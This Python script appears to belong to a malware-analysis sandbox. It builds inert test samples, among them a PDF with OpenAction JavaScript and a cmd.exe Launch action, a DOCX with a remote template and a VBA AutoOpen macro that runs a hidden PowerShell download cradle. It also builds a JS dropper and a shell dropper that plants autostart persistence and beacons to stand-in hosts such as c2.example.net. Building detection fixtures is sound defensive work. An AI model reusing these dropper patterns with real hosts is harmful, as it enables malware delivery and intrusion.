#!/usr/bin/env python3
"""Generate test samples that exercise every analyzer path.

These are deliberately INERT. They reproduce the *structure* of malicious attachments --
an auto-open macro, a /Launch action, a decoy extension, a base64 blob -- so the analyzers
and signature rules can be verified, but none of them carries a working payload and the
network addresses are RFC 2606 / RFC 5737 reserved. Nothing here will do harm if it leaks
out of the sandbox, which is the only responsible way to ship a detection test suite.
"""
from __future__ import annotations

import base64
import os
import struct
import sys
import zipfile

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "samples")

# Reserved for documentation/testing -- these can never resolve to a real host.
FAKE_URL = "http://malicious.example.com/stage2.exe"
FAKE_HOST = "c2.example.net"
FAKE_IP = "192.0.2.66"


def compress_ovba(data: bytes) -> bytes:
    """MS-OVBA 2.4.1 container built from uncompressed chunks only -- spec-valid and simple.

    Real module streams store source this way (via the compression algorithm); using the
    uncompressed-chunk form keeps the encoder trivial while still producing a container that
    olevba's own decompress_stream accepts, so the recovery path is exercised for real.
    """
    out = bytearray(b"\x01")                      # CompressedContainer SignatureByte
    for i in range(0, len(data) or 1, 4096):
        chunk = data[i:i + 4096]
        raw = chunk + b"\x00" * (4096 - len(chunk))
        header = 0x0FFF | (0b011 << 12)           # size-3=0xFFF, sig=011, uncompressed flag=0
        out += header.to_bytes(2, "little") + raw
    return bytes(out)


def w(name: str, data: bytes) -> str:
    path = os.path.join(OUT, name)
    with open(path, "wb") as fh:
        fh.write(data)
    return path


# ------------------------------------------------------------------ 1. benign PDF
def benign_pdf() -> str:
    body = b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 60>>stream
BT /F1 12 Tf 72 700 Td (Quarterly report. Nothing to see.) Tj ET
endstream
endobj
trailer<</Root 1 0 R>>
%%EOF
"""
    return w("benign_report.pdf", body)


# ------------------------------------------------------- 2. malicious-shaped PDF
def hostile_pdf() -> str:
    js = (b"var payload = unescape('%u9090%u9090');\n"
          b"app.alert('opening');\n"
          b"this.exportDataObject({cName:'invoice', nLaunch:0});\n"
          b"var u = 'http://' + 'malicious' + '.example.com' + '/stage2.exe';\n")
    body = b"""%PDF-1.7
1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R/Names<</JavaScript 6 0 R>>>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[7 0 R]>>endobj
5 0 obj<</Type/Action/S/JavaScript/JS 8 0 R>>endobj
6 0 obj<</Names[(evil) 5 0 R]>>endobj
7 0 obj<</Type/Annot/Subtype/Link/A<</Type/Action/S/URI/URI(""" + FAKE_URL.encode() + b""")>>>>endobj
8 0 obj<</Length """ + str(len(js)).encode() + b""">>stream
""" + js + b"""
endstream
endobj
9 0 obj<</Type/Action/S/Launch/Win<</F(cmd.exe)/P(/c calc.exe)>>>>endobj
trailer<</Root 1 0 R>>
%%EOF
"""
    return w("invoice_scan.pdf", body)


# ------------------------------------------------ 3. OOXML with remote template
def remote_template_docx() -> str:
    path = os.path.join(OUT, "payment_advice.docx")
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml",
                    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                    'package/2006/content-types"><Default Extension="xml" '
                    'ContentType="application/xml"/></Types>')
        zf.writestr("_rels/.rels",
                    '<?xml version="1.0"?><Relationships xmlns="http://schemas.'
                    'openxmlformats.org/package/2006/relationships">'
                    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
                    'officeDocument/2006/relationships/officeDocument" '
                    'Target="word/document.xml"/></Relationships>')
        zf.writestr("word/document.xml",
                    '<?xml version="1.0"?><w:document xmlns:w="http://schemas.'
                    'openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r>'
                    '<w:t>Enable editing to view this payment advice.</w:t>'
                    '</w:r></w:p></w:body></w:document>')
        # The actual attack: settings.xml.rels points the attached template at a remote host.
        zf.writestr("word/_rels/settings.xml.rels",
                    '<?xml version="1.0"?><Relationships xmlns="http://schemas.'
                    'openxmlformats.org/package/2006/relationships">'
                    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
                    'officeDocument/2006/relationships/attachedTemplate" '
                    f'Target="http://{FAKE_HOST}/template.dotm" TargetMode="External"/>'
                    '</Relationships>')
    return path


# ------------------------------------------------------- 4. OLE doc with VBA macro
def macro_doc() -> str:
    """A real OLE2 container with a VBA-looking stream.

    olevba parses OLE structure, so this needs to be a genuine compound file. Building a
    minimal-but-valid OLE2 by hand is the only way to test the OLE path without shipping
    a real malicious document.
    """
    macro = (
        'Sub AutoOpen()\r\n'
        '  Dim s As String\r\n'
        '  s = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & '
        'Chr(104) & Chr(101) & Chr(108) & Chr(108)\r\n'
        '  Dim u As String\r\n'
        f'  u = "http://" & "{FAKE_HOST}" & "/p.txt"\r\n'
        '  Set o = CreateObject("WScript.Shell")\r\n'
        '  o.Run s & " -w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).'
        'DownloadString(\'" & u & "\')", 0, False\r\n'
        'End Sub\r\n'
        'Sub Document_Open()\r\n'
        '  AutoOpen\r\n'
        'End Sub\r\n'
    ).encode("latin-1")

    # Store the source the way a real module stream does: MS-OVBA-compressed. olevba cannot
    # parse this hand-built project (no valid dir/PROJECT stream), which is exactly the
    # "malformed VBA project" evasion -- so this fixture exercises the recovery fallback.
    macro = compress_ovba(macro)

    # Minimal CFBF: header + FAT + directory + one stream, all in 512-byte sectors.
    sector = 512
    header = bytearray(sector)
    header[0:8] = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
    header[24:26] = struct.pack("<H", 0x003E)      # minor version
    header[26:28] = struct.pack("<H", 0x0003)      # major version 3
    header[28:30] = struct.pack("<H", 0xFFFE)      # little-endian marker
    header[30:32] = struct.pack("<H", 9)           # 2^9 = 512-byte sectors
    header[32:34] = struct.pack("<H", 6)           # 2^6 = 64-byte mini sectors
    header[44:48] = struct.pack("<I", 1)           # one FAT sector
    header[48:52] = struct.pack("<I", 1)           # directory starts at sector 1
    header[56:60] = struct.pack("<I", 4096)        # mini-stream cutoff
    header[60:64] = struct.pack("<I", 0xFFFFFFFE)  # no mini FAT
    header[64:68] = struct.pack("<I", 0)
    header[68:72] = struct.pack("<I", 0xFFFFFFFE)  # no DIFAT
    header[72:76] = struct.pack("<I", 0)
    header[76:80] = struct.pack("<I", 0)           # FAT sector 0

    payload_sectors = (len(macro) + sector - 1) // sector

    fat = bytearray()
    fat += struct.pack("<I", 0xFFFFFFFD)           # sector 0: the FAT itself
    fat += struct.pack("<I", 0xFFFFFFFE)           # sector 1: directory, end of chain
    for i in range(payload_sectors):
        nxt = 0xFFFFFFFE if i == payload_sectors - 1 else 2 + i + 1
        fat += struct.pack("<I", nxt)
    fat += b"\xff" * (sector - len(fat))

    def dir_entry(name: str, etype: int, start: int, size: int,
                  child=0xFFFFFFFF, left=0xFFFFFFFF, right=0xFFFFFFFF) -> bytes:
        entry = bytearray(128)
        encoded = name.encode("utf-16-le") + b"\x00\x00"
        entry[0:len(encoded)] = encoded
        entry[64:66] = struct.pack("<H", len(encoded))
        entry[66] = etype                          # 1=storage, 2=stream, 5=root
        entry[67] = 1                              # black
        entry[68:72] = struct.pack("<I", left)
        entry[72:76] = struct.pack("<I", right)
        entry[76:80] = struct.pack("<I", child)
        entry[116:120] = struct.pack("<I", start)
        entry[120:124] = struct.pack("<I", size)
        return bytes(entry)

    directory = (
        dir_entry("Root Entry", 5, 0xFFFFFFFE, 0, child=1)
        + dir_entry("Macros", 1, 0xFFFFFFFE, 0, child=2)
        + dir_entry("VBA", 2, 2, len(macro))
        + b"\x00" * 128
    )
    directory += b"\x00" * (sector - len(directory) % sector) if len(directory) % sector else b""

    blob = bytes(header) + bytes(fat) + directory + macro
    blob += b"\x00" * ((-len(blob)) % sector)
    return w("invoice_2024.doc", blob)


# --------------------------------------------------- 5. archive with decoy exe
def decoy_archive() -> str:
    path = os.path.join(OUT, "shipping_documents.zip")
    fake_pe = (b"MZ\x90\x00" + b"\x00" * 56 + struct.pack("<I", 0x80) + b"\x00" * 60
               + b"PE\x00\x00" + b"\x00" * 512)
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("Shipping Notice.pdf", b"%PDF-1.4\n% harmless decoy\n%%EOF\n")
        # The payload: looks like a PDF in a file listing, is actually an executable.
        zf.writestr("Invoice.pdf                                   .exe", fake_pe)
        zf.writestr("readme.txt", b"Please open the invoice.\n")
    return path


# ------------------------------------------------- 6. obfuscated script dropper
def js_dropper() -> str:
    encoded = base64.b64encode(
        (f"powershell -w hidden -nop -ep bypass -enc "
         f"{base64.b64encode(f'IEX(New-Object Net.WebClient).DownloadString(\"{FAKE_URL}\")'
                             .encode('utf-16-le')).decode()}").encode()
    ).decode()
    source = f"""var _0x = String.fromCharCode(87,83,99,114,105,112,116,46,83,104,101,108,108);
var cmd = "{encoded}";
var host = "{FAKE_HOST}";
var url = "ht" + "tp://" + host + "/gate.php";
try {{
  var x = new ActiveXObject("MSXML2.XMLHTTP");
  x.open("GET", url, false);
  x.send();
  var s = new ActiveXObject("WScript.Shell");
  s.Run("cmd.exe /c echo staged", 0, false);
}} catch (e) {{ }}
"""
    return w("invoice_details.js", source.encode())


# --------------------------------------------------- 7. shell script (real exec)
def shell_dropper() -> str:
    """Actually runs in the sandbox. Proves the strace + fakenet path end to end."""
    source = f"""#!/bin/sh
# Behaves like a Linux-side dropper: resolve a host, fetch a stage, drop and chmod it.
echo "[sample] starting"
mkdir -p "$HOME/.config/autostart" 2>/dev/null
echo "persistence marker" > "$HOME/.config/autostart/updater.desktop"
printf 'stage2 body' > /tmp/work/stage2.bin
chmod 755 /tmp/work/stage2.bin
# Resolves through the sandbox's fake DNS; the sink records the request.
getent hosts {FAKE_HOST} >/dev/null 2>&1
python3 - <<'PY' 2>/dev/null
import socket, urllib.request
try:
    urllib.request.urlopen("http://{FAKE_HOST}/gate.php?id=victim", timeout=4).read()
except Exception:
    pass
try:
    s = socket.create_connection(("{FAKE_IP}", 4444), timeout=3)
    s.send(b"beacon")
    s.close()
except Exception:
    pass
PY
rm -f /tmp/work/stage2.bin
echo "[sample] done"
"""
    return w("update_helper.sh", source.encode())


# ---------------------------------------------------------------- 8. fake PE
def fake_pe() -> str:
    """A structurally valid PE32 with packer-style sections, W+X, and a PE in the overlay.

    Built field-by-field rather than with one big struct.pack, because the PE32 optional
    header has 30-odd fields and a positional pack is unreadable and easy to get wrong.
    """
    import random
    random.seed(1337)

    dos = bytearray(0x80)
    dos[0:2] = b"MZ"
    dos[2:0x3C] = b"\x90" * (0x3C - 2)
    dos[0x3C:0x40] = struct.pack("<I", 0x80)      # e_lfanew -> PE header

    # COFF file header. The timestamp is deliberately far in the future so the
    # "implausible compile timestamp" rule has something to fire on.
    coff = struct.pack(
        "<HHIIIHH",
        0x14C,          # Machine: i386
        2,              # NumberOfSections
        0xF0000000,     # TimeDateStamp: year 2097
        0, 0,           # symbol table (none)
        0xE0,           # SizeOfOptionalHeader
        0x0102,         # Characteristics: EXECUTABLE_IMAGE | 32BIT_MACHINE
    )

    opt = bytearray(0xE0)
    struct.pack_into("<H", opt, 0, 0x10B)         # Magic: PE32
    struct.pack_into("<BB", opt, 2, 14, 0)        # linker version
    struct.pack_into("<I", opt, 4, 0x400)         # SizeOfCode
    struct.pack_into("<I", opt, 16, 0x1000)       # AddressOfEntryPoint (inside UPX0)
    struct.pack_into("<I", opt, 20, 0x1000)       # BaseOfCode
    struct.pack_into("<I", opt, 28, 0x400000)     # ImageBase
    struct.pack_into("<I", opt, 32, 0x1000)       # SectionAlignment
    struct.pack_into("<I", opt, 36, 0x200)        # FileAlignment
    struct.pack_into("<H", opt, 40, 6)            # MajorOperatingSystemVersion
    struct.pack_into("<H", opt, 48, 6)            # MajorSubsystemVersion
    struct.pack_into("<I", opt, 56, 0x7000)       # SizeOfImage
    struct.pack_into("<I", opt, 60, 0x400)        # SizeOfHeaders
    struct.pack_into("<H", opt, 68, 2)            # Subsystem: WINDOWS_GUI
    struct.pack_into("<I", opt, 72, 0x100000)     # SizeOfStackReserve
    struct.pack_into("<I", opt, 76, 0x1000)       # SizeOfStackCommit
    struct.pack_into("<I", opt, 80, 0x100000)     # SizeOfHeapReserve
    struct.pack_into("<I", opt, 84, 0x1000)       # SizeOfHeapCommit
    struct.pack_into("<I", opt, 92, 16)           # NumberOfRvaAndSizes
    # Every data directory stays zero -- including the security directory, so the
    # sample reads as unsigned.

    def section(name: bytes, vsize: int, vaddr: int, rsize: int, raddr: int, chars: int):
        return (name.ljust(8, b"\x00")
                + struct.pack("<IIII", vsize, vaddr, rsize, raddr)
                + struct.pack("<IIHHI", 0, 0, 0, 0, chars))

    # UPX0 is virtual-only (raw size 0) and UPX1 is writable + executable: the classic
    # unpacking-stub layout.
    sections = (
        section(b"UPX0", 0x4000, 0x1000, 0, 0, 0xE0000080)        # RWX, uninitialised
        + section(b"UPX1", 0x1000, 0x5000, 0x400, 0x400, 0xE0000040)  # RWX, initialised
    )

    headers = bytes(dos) + b"PE\x00\x00" + coff + bytes(opt) + sections
    headers += b"\x00" * (0x400 - len(headers))

    packed = bytes(random.getrandbits(8) for _ in range(0x400))       # high entropy
    overlay = b"MZ" + bytes(random.getrandbits(8) for _ in range(0x20000))
    return w("SecurityUpdate.scr", headers + packed + overlay)


# ------------------------------------------------------------ 9. benign text
def benign_text() -> str:
    return w("meeting_notes.txt",
             b"Notes from the Tuesday sync.\n- Ship the sandbox\n- Review the report schema\n")


BUILDERS = [
    ("benign PDF", benign_pdf),
    ("PDF with OpenAction JS + Launch + URI", hostile_pdf),
    ("DOCX with remote template injection", remote_template_docx),
    ("OLE doc with obfuscated auto-open macro", macro_doc),
    ("ZIP with a decoy .exe behind a padded name", decoy_archive),
    ("obfuscated JS dropper", js_dropper),
    ("shell dropper (actually executes)", shell_dropper),
    ("packed PE with W+X section and PE overlay", fake_pe),
    ("benign text file", benign_text),
]


def main() -> int:
    os.makedirs(OUT, exist_ok=True)
    for description, builder in BUILDERS:
        try:
            path = builder()
            print(f"  {os.path.basename(path):<48} {os.path.getsize(path):>8} B  {description}")
        except Exception as exc:
            print(f"  FAILED {builder.__name__}: {type(exc).__name__}: {exc}", file=sys.stderr)
            return 1
    print(f"\n{len(BUILDERS)} samples written to {OUT}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
